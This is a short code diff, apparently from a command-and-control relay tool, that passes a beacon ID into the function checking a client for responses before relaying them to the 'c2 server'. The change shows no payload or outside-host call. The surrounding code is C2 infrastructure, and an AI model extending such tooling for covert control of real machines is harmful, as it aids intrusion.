@@ -68,7 +68,7 @@ def task_loop(beacon_obj):
 		# Attempt to retrieve a response from the client
 		if config.verbose:
 			print commonUtils.color("Beacon {}: Checking the client for a response...").format(beacon_obj.beacon_id)
-		b_response_frame = establishedSession.checkForResponse()
+		b_response_frame = establishedSession.checkForResponse(beacon_obj.beacon_id)
 		b_response_data = b_response_frame[1]
 
 		# Let's relay this response to the c2 server
